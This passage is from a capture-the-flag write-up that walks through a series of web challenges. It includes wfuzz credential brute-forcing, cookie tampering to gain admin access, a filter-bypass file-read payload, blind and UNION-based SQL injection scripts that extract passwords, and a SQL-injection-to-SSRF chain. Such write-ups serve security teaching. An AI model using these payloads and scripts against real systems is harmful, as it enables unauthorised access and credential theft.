WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
```

These looked like base64, so I decoded them:

```bash
$ curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r '.sessions[]' | base64 -d | jq

{
  "user": null,
  "cookie": "YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="
}
{
  "user": null,
  "cookie": "ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="
}
{
  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
{
  "user": null,
  "cookie": "MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="
}
{
  "user": null,
  "cookie": "M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="
}
{
  "user": null,
  "cookie": "MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="
}
{
  "user": null,
  "cookie": "MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="
}
{
  "user": null,
  "cookie": "OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="
}
```

I now had a session associated with an authenticated user (the third one down in the list). Using the cookie didn't seem to have any effect, so I went back to try and figure out what was up with the `user` endpoint.

This time I used `wfuzz` to try and find the missing parameter(s).

```bash
wfuzz --hc=400 -zfile,wordlists/params.txt https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=1
```

This revealed the `uuid` parameter:

{F1134540}

When I decoded the session data, there was a UUID (`C7DCCE-0E0DAB-B20226-FC92EA-1B9043`) included in the `user` parameter. This couldn't be a coincidence! I used it in the `uuid` parameter on the `user` endpoint:

```bash
$ curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}% 
```

And there was the flag!

Flag: `flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`

## Flag 5: Secure Login

The page at [/secure-login](https://hackyholidays.h1ctf.com/secure-login) consisted of a fairly minimal login form.

Trying SQL injection etc. yielded no results, but there was an interesting error message here when I entered some gibberish:

{F1134538}

The login page specifically told me when the supplied username was invalid, as opposed to giving a generic "login failed" message that didn't explain whether it was the username or password at fault. This means I could brute-force for a valid username.

I cracked open wfuzz again:

```bash
$ wfuzz -zfile,wordlists/usernames.txt --hs 'Invalid Username' -d 'username=FUZZ&password=blah' https://hackyholidays.h1ctf.com/secure-login

********************************************************
* Wfuzz 2.4.2 - The Web Fuzzer                         *
********************************************************

Target: https://hackyholidays.h1ctf.com/secure-login
Total requests: 22342

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                             
===================================================================

000005730:   200        36 L     84 W     1724 Ch     "access"  
```

Nice, wfuzz found a username: `access`. I tried to login with this username and a random password, and got a new error:

{F1134537}

Next it was just a matter of brute forcing the password...

```
wfuzz -zfile,wordlists/passwords.txt --hs 'Invalid Password' -d 'username=access&password=FUZZ' https://hackyholidays.h1ctf.com/secure-login 

********************************************************
* Wfuzz 2.4.2 - The Web Fuzzer                         *
********************************************************

Target: https://hackyholidays.h1ctf.com/secure-login
Total requests: 9953

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                             
===================================================================

000000053:   302        0 L      0 W      0 Ch        "computer" 
```

...and then I had a password too! I tried to login with `access:computer` to collect the flag!

{F1134536}

...or maybe not. There was no flag there. I took a look around at the new page and noticed the `securelogin` cookie that had been set during login.

{F1134535}

The cookie had a value of `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`, which base64 decoded to `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. I encoded a new JSON object with `admin` set to `true` and refreshed the page, hoping to elevate my access...

```
$ echo '{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}' | base64 -w0
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo=
```

Setting the `securelogin` cookie to the value encoded above and reloading the page revealed a new file I could now download.

{F1134534}

I downloaded the `my_secure_files_not_for_you.zip`, and found it was password protected. A great tool for brute forcing zip passwords is `fcrackzip`, so I pointed it at the archive and pulled the trigger:

```
fcrackzip -u -D -p wordlists/passwords.txt my_secure_files_not_for_you.zip    

PASSWORD FOUND!!!!: pw == hahahaha
```

The password was `hahahaha`! Unzipping revealed two interesting things. 

Firstly I had what appeared to be a Grinch nude (!?)

{F1134533}

I'm not sure what impact this had on my one-year old son who was watching. I guess I'll find out in a few years. Anyway, the other file was `flag.txt`:

```bash
$ cat flag.txt 
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

Solved!

Flag: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

## Flag 6: Diary

The challenge started at `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`. This straight-up looked like an LFI vulnerability, so I tried a few obvious values for the `template` parameter such as `/etc/passwd`, `../../../../../../../etc/passwd` and found nothing - everything resulted in a redirect back to the original URL.

I thought it'd be a good idea to try to locate `entries.html` and see if it was publicly accessible. It turned out that `https://hackyholidays.h1ctf.com/my-diary/entries.html` was it's actual location. In that case, the `template` parameter was loading files relative to it's own directory. For that reason I tried `index.php` as a `template` value, to trick the script into providing me with it's own source code:

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

It worked! I now had the source code of the script. It looked like there was once an `admin.php` page, which according to a comment, had been renamed to `secretadmin.php`. Trying to hit that file directly in the browser resulted in:

```
You cannot view this page from your IP Address
```

I couldn't simply pass `secretadmin.php` as an argument to the original script to read the file, because it did a couple of string replacements on the passed parameter:

```
// ...
$page = str_replace("admin.php","",$page);
// ...
$page = str_replace("secretadmin.php","",$page);
// ...
```

So passing `secretadmin.php` would result in a value of `secret`, because of the `s/admin\.php//` replacement.

I bypassed this questionable security measure by passing a value of `secretadsecretaadmin.phpdmin.phpmin.php`.

This works because:

1. Replacing `admin.php` in `secretadsecretaadmin.phpdmin.phpmin.php` results in `secretadsecretadmin.phpmin.php`
2. Replacing `secretadmin.php` in `secretadsecretadmin.phpmin.php` results in `secretadmin.php`

```bash
$ curl -s https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php | grep flag
    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>
```

Success!

Flag: `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

## Flag 7: Hate Mail Generator

Starting out, I could see I had access to some sort of email campaign management application.

{F1134531}

Clicking `Create New` prompted for `name`, `subject` and `markup` fields. Having access to a `markup` field made me think this was going to be something like XSS or SSTI.

Looking at the campaign which was already there provided another interesting bit of info:

{F1134532}

It seemed the templating language supported the inclusion of other files. An LFI vuln? I set up a new campaign with a `template` directive for a file which didn't exist:

{F1134530}

Hitting `Preview` resulted in an error which disclosed the location of a `templates` directory.

```
Cannot find template file /templates/whatever
```

Directory listings were enabled for the [/hate-mail-generator/templates/]( https://hackyholidays.h1ctf.com/hate-mail-generator/templates/) directory, and disclosed the existence of `38dhs_admins_only_header.html`. 

{F1134529}

Navigating to this file directly resulted in a `403`, so I tried to use the `template` directive again to read it via a campaign preview:

{F1134528}

My smugness dissipated when the approach failed with `You do not have access to the file 38dhs_admins_only_header.html`.

Taking a step back and doing a bit more recon meant that I spotted an HTML block that looked helpful:

{F1134527}

Whilst the markup in the campaign editor did not allow the inclusion of the admin-only file, perhaps this content did? First of all I adjusted the content to the following with dev tools:

{F1134526}

Then I set the content of the campaign markup to `{{name}}` to make use of the variable I modified. Hitting preview then gave me the flag:

{F1134525}

Flag: `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

## Flag 8: Forum

After taking a look around this forum, I couldn't find any immediate issues. Fuzzing revealed the presence of phpMyAdmin at [/forum/phpmyadmin](https://hackyholidays.h1ctf.com/forum/phpmyadmin), but the default login did not work.

In order to check if the forum was based on any open-source software, I searched for one of the messages: `You need to be an admin to view these posts` on [GitHub](https://github.com/search?q=%22You+need+to+be+an+admin+to+view+these+posts%22&type=code). Not only was it running software that was found on GitHub, the code was listed under the organisation `Grinch-Networks`.

{F1134524}

Browsing the commit history revealed some juicy database credentials that looked to have been committed by accident at some stage and later removed: `forum:6HgeAZ0qC9T6CQIqJpD`

{F1134523}

I logged in to phpMyAdmin with the discovered credentials. Browsing the users table revealed some usernames and hashed passwords. The other tables were not accessible in phpMyAdmin.

{F1134522}

Instead of cracking the hashes, I googled them - it's a much quicker way to crack hashes than bruting them locally! The `grinch` users hash was `35D652126CA1706B59DB02C93E0C9FBF`, and turned out to be a hash of `BahHumbug`.

At this point I could log in to the forum with `grinch:BahHumbug` and view an admin-only post containing the flag.

{F1134521}

Flag: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`

## Flag 9: Evil Quiz

Filling out the quiz with some random answers to get a feel for the process resulted in the following page being shown:

{F1134519}

The message about the number of players with the same name was quite revealing here. It told me that the quiz was *stateful*. It remembered the names of all players that filled it out. This meant there was likely a database backing this application. I immediately started thinking along the lines of a potential SQL injection vulnerability.

I went back to the beginning and set the `name` field to `' OR sleep(5)='`. Proceeding into the rest of the quiz resulted in 5 second delays, meaning an SQL injection vulnerability was indeed present. The final page included the message `There is 1195892 other player(s) with the same name as you!` which suggests my attack was at least working on the query to calculate the number of players with a similar name.

I started the process of working out what tables/columns existed and what data I could exfiltrate.

First of all I worked out the number of columns being returned in the query by trying the following:

| Name                             | # of players |
|----------------------------------|--------------|
| `Jfjrir' union select 1;/*`         | 0            |
| `Jfjrir' union select 1,2;/*`       | 0            |
| `Jfjrir' union select 1,2,3;/*`     | 0            |
| `Jfjrir' union select 1,2,3,4;/*`   | 1            |

4 columns then! Normally at this point I'd start pulling data from `information_schema.tables`, but before resorting to this I tested to see if I could guess the names of some existing tables. I got lucky and ` Jfjrir' union select 1,2,3,4 from admin;/*` returned a single row (player).

After tweaking the query a few times I figured out that a user with the `username` of `admin` existed in the table - at this point I started writing a script to pull out the `admin` password:

```python
#!/usr/bin/env python3
import requests

url='https://hackyholidays.h1ctf.com/evil-quiz'
cookies={'session': '4fbc0cc824c9ee373d677e1840288aaf'}
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./{}:@~<>?'

def attack(password):
    index=len(password)+1
    for letter in alphabet:
        data={'name': "Jfjrir' union select 1,2,3,4 from admin where username ='admin' and ord(substr(password, %d, 1))='%d" % (index, ord(letter))}
        r = requests.post(url, cookies=cookies, data=data)
        r = requests.get(url + '/score', cookies=cookies)
        if 'There is 1 other' in r.text:
            return password + letter
    return password

password=''
while True:
    np=attack(password)
    if np == password:
        print("Password found: '%s'" % (password))
        break
    password=np

```

Running the script:

```bash
$ ./quiz.py
Password found: 'S3creT_p4ssw0rd-$'
```

Logging in to the admin area with `admin:S3creT_p4ssw0rd-$` gave me the flag.

Flag: `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`

## Flag 10: SignUp Manager

After a little basic recon, I spotted a comment at the top of the initial page:

```html
<!-- See README.md for assistance -->
```

There was indeed a [/signup-manager/README.md](https://hackyholidays.h1ctf.com/signup-manager/README.md), which contained:

```markdown
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

Lots of info there! After playing with the form it seemed I could add users and sign in as them, so it made sense that I needed to elevate my privileges to `admin` level to find the flag. Step 6 in the README mentioned tweaking the last character of the `users.txt` file in order to make somebody admin, so it looked like I needed to find a way to do that.

The README also mentioned a `signupmanager.zip` file which was also available in the same directory. I downloaded and extracted it.

At this point I was stuck for about 8 hours, as for me the zip was corrupt and only extracted a single file. This seems to have happened to others according to Twitter so not sure what happened there, but after downloading it again later it contained more files. Weird!

Anyway, the `index.php` contained the following:

```php
<?php
if( isset($_GET["logout"]) ){
    setcookie('token',null,time()-3600);
    header("Location: ".explode("?",$_SERVER["REQUEST_URI"])[0]);
    exit();
}
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
$all_users = buildUsers();
$page = 'signup.php';
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
if( $page == 'signup.php' ) {
    $errors = array();
    if (isset($_POST["action"])) {
        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
            if( isset($all_users[ $_POST["username"] ]) ){
                $u = $all_users[ $_POST["username"] ];
                if( md5($_POST["password"]) === $u["password"] ){
                    setcookie('token', $u["cookie"], time() + 3600);
                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                    exit();
                }
            }
            $errors[] = 'Username and password combination not found';
        }
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
include_once($page);
```

So each field in the `users.txt` has it's length capped to a set value. This meant that whether or not the user was an admin `Y/N` was always present at the same offset for each line.

If I could find a way to make another field too long, I could shift my own content (`Y`) into the position of the `N` and become admin. All of the fields are explicitly capped to certain lengths, except for `age`.

I ascertained the following about the `age` field from the above code:

- It must be numeric
- It must have a maximum string length of 3
- It will be padded to a length of 3 characters if it is too short (<3 chars)
- Is preceeded in users.txt by the `lastname` field.

I realised the exponent format value `1e3` would meet the above criteria, but be longer than 3 characters when converted to an integer (`1000`). This would mean the last character of my last name would be pushed into the `admin` field. So setting the last character of my last name to `Y` and making sure it was the maximum length of a last name (15 characters) should result in the system signing me up as an admin user.

I signed up with an age of `1e3` (using dev tools to change the value of the dropdown option):

{F1134520}

...and a last name of `YYYYYYYYYYYYYYY`...

{F1134518}

...and was presented with the flag. Success!

Flag: `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`

## Flag 11: Recon

No new app was added for this challenge, so at first I wasn't sure where to start. Going back and completing the previous flag again resulted in a new message being shown with a link to a new directory: [/r3c0n_server_4fdk59](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59).

{F1134517}

There was a lot going on here. First of all the presence of an API was mentioned at the top of the page. Then there was a list of recon photo albums, each containing one or more photos. Additionally, a link to an "attack box" was included that resulted in a login page.

### API

Since the comment mentioned an API, I tried [/r3c0n_server_4fdk59/api](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api) and found a page about API response codes.

{F1134515}

I tried fuzzing the `/r3c0n_server_4fdk59/api` path for endpoints, but all requests resulted in a 401 status code. The docs note that a 401 means `Unauthenticated Request or Invalid client IP` in this context. So I either needed to bolt on an `Authorization` header to our requests, or I needed to make the requests from a particular location, likely `localhost`.

### Recon Gallery

I tried messing with the parameters of each gallery script, and found that adding `' or '1'='2` to the end of the `/r3c0n_server_4fdk59/album?hash=jdh34k` URL was successful, and it looked vulnerable to SQL injection.

After some manual fiddling, I ascertained that there were two tables, but sadly no sensitive data available. 

I used the following to dump the tables and columns:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20ALL%20SELECT%201,%27BLAH%27,group_concat(concat(table_name,%27:%27,column_name))%20from%20information_schema.columns%20WHERE%20table_schema=%27recon%27;/*
```

Here's an example of most of the database content being dumped:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20ALL%20SELECT%201,%27BLAH%27,group_concat(concat(%27\n\nPhoto%20ID:%20%27,%20photo.id,%27%20\nPhoto:%27,photo,%27%20%20\nAlbum%20hash:%20%27,%20hash,%27\nAlbum%20ID:%20%27,album.id))%20from%20photo%20LEFT%20JOIN%20album%20on%20album.id%3dphoto.album_id%20limit%201;/*
```

The above spat out:

```
Photo ID: 1 
Photo:0a382c6177b04386e1a45ceeaa812e4e.jpg  
Album hash: 3dir42
Album ID: 1,

Photo ID: 2 
Photo:1254314b8292b8f790862d63fa5dce8f.jpg  
Album hash: 3dir42
Album ID: 1,

Photo ID: 3 
Photo:32febb19572b12435a6a390c08e8d3da.jpg  
Album hash: 59grop
Album ID: 2,

Photo ID: 4 
Photo:db507bdb186d33a719eb045603020cec.jpg  
Album hash: jdh34k
Album ID: 3,

Photo ID: 5 
Photo:9b881af8b32ff07f6daada95ff70dc3a.jpg  
Album hash: jdh34k
Album ID: 3,

Photo ID: 6 
Photo:13d74554c30e1069714a5a9edda8c94d.jpg  
Album hash: jdh34k
Album ID: 3
```

At this point it looked like there was nothing else in the database to squeeze out.

Some of my earlier manual fiddling resulted in `asdasd' UNION ALL SELECT 1,1,1;/*` pulling back photos from an album. Changing the first `1` to `2` and then `3` pulled back photos from each of the other two photo albums. This made me think the page was running two queries behind the scenes. Something along the lines of:

Pull the requested photo album out by it's hash (from query param `hash`):

`SELECT id, x, y FROM albums WHERE hash = ?`

And then pull all photos out for that album, using the returned `id` from the above query as the album id:

`SELECT * FROM photos WHERE album_id = ?`

I had also taken a look at the script that loaded each image content. The output of the gallery script loaded images using the following:

{F1134516}

Decoding the base64 parameter for one of them revealed:

```json
{"image":"r3c0n_server_4fdk59\/uploads\/0a382c6177b04386e1a45ceeaa812e4e.jpg","auth":"ec5a9920e177ccc84974146f93ae04b0"}
```

I realised I could potentially trick the `picture` script into including other local files by abusing the `data` parameter, if I set the `image` field in the JSON to an arbritary file. It turned out this didn't work because of the `auth` hash. It looked like this hash was a hash of the `image` value and an unknown salt, meaning this wasn't exploitable without further information - I would have needed to set the hash to the correct value, which was unknowable. I tried brute forcing salts but didn't get anywhere.

At this point it clicked that these two vulnerabilities could be chained - I could use the SQL injection to set an arbitrary path, and the gallery script would automatically set the auth hash for me, then calling the `picture` script with the gallery-generated value would give me LFI (or SSRF).


```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%220a382c6177b04386e1a45ceeaa812e4e.jpg\%22;/*%22,1,1;/*
```

This request worked - I could now control the source of the image on the page!

### Chaining Vulnerabilities

I realised that the `picture` script could be pulling images via an HTTP request internally, rather than including them, which would mean a way to call the API from `localhost` via SSRF.

I assembled the following request to verify if the images were being pulled via HTTP request or direct inclusion. It simply involved adding a query string parameter `?whatever=1` to the previous URL. The plan was the query parameter `whatever` would be handled properly by an HTTP server (effectively ignored), but would not be translatable to the file system of the host. 

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%220a382c6177b04386e1a45ceeaa812e4e.jpg?whatever%3d1\%22;/*%22,1,1;/*
```

This request worked - the image was still loaded. So it looked like I had an SSRF vulnerability - via SQL injection - inside of *another* SQL injection. 

{F1134508}

The image paths in the database that I dumped earlier were simply filenames with no directory information. I knew from decoding the base64 in the `picture` links that the images live in the `uploads` directory, so any SSRF paths need to be constructed relative to that directory.

I wanted to try and call the API via the SSRF, so I assembled the following:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*
```

Calling this URL gave us a `picture` endpoint URL which should result in an SSRF on the `api/hello` endpoint. I didn't expect this endpoint to actually exist - but I was hoping for an improvement on the `401` received by calling anything `api/*` directly over the internet. A `404` would be nice.

```
$ curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*' | grep picture
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2hlbGxvIiwiYXV0aCI6ImEwZTY4MmQ2YjRiNWVjYTM2NDJlMTU5NmQ4OGE5MDk2In0=">

$ curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2hlbGxvIiwiYXV0aCI6ImEwZTY4MmQ2YjRiNWVjYTM2NDJlMTU5NmQ4OGE5MDk2In0='

Expected HTTP status 200, Received: 404
```

This was interesting! The `picture` script complained that it wanted a `200` status, but got a `404` instead. This meant I was no longer experiencing `401` statuses!

I tried a few common endpoints and spotted a `200` response for the `api/user` endpoint. Sadly the raw response wasn't returned, as the `picture` script complained about a bad content type, probably because it was expecting an image and instead received some JSON describing a user!

I tried appending some query string parameters to see if it was possible to check for the existance of different users, and spotted that when `?username=blah` was appended, a `404` was returned! So it looked possible to brute force usernames. I tried this and was initially unsuccessful, until I spotted `?username=%25` didn't return a `404`! Wildcards were accepted, meaning I could brute force much quicker!

I knocked up a bit of Python to do the job for me:

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup as BSHTML

start=''
alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'

def guess(start):
    for letter in alphabet:
        attempt=start+letter
        url = f'''https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%22../api/user?username={attempt}%25\%22;/*%22,1,1;/*'''
        r = requests.get(url)
        soup = BSHTML(r.text, "html.parser")
        images = soup.findAll('img')
        r = requests.get("https://hackyholidays.h1ctf.com" + images[1]["src"])
        if len(r.text) != 39:
            return attempt
    return start

updated=guess(start)
while updated != start:
    start = updated
    updated=guess(start)
    print("nearly there: " + updated)

print("found: " + updated)
```

Running the script quickly revealed:

```
found: grinchadmin
```

Awesome! Next I needed to find the password - could it be as simple as doing the same thing with a password parameter? I didn't expect this to work, but it did! I adjusted the above script and swapped `?username=` for `?password=` and ran it, finding:

```
found: s4nt4sucks
```

I now had a set of credentials: `grinchadmin:s4nt4sucks`. Going back to the login page I spotted at the beginning of the challenge and trying these credentials there seemed like a logical next step, so I did so.

![attack box](flag11.d.png)

Another flag down!

Flag: `flag{07a03135-9778-4dee-a83c-7ec330728e72}`

## Flag 12: DDoS

This challenge continues from where I left off in the previous one. I had access to the "attack box", which contained links to launch DDoS attacks on various preset targets.

The links looked like this:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

Clicking the above link resulted in a DDoS attack being launched, which hilariously is the l33t hacker tool *ping*!

{F1134513}

I decoded the `payload` parameter from the above link and found:

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

So the payload contained the IP address to launch an attack against. I tried to encode my own payload with a target of `127.0.0.1`:
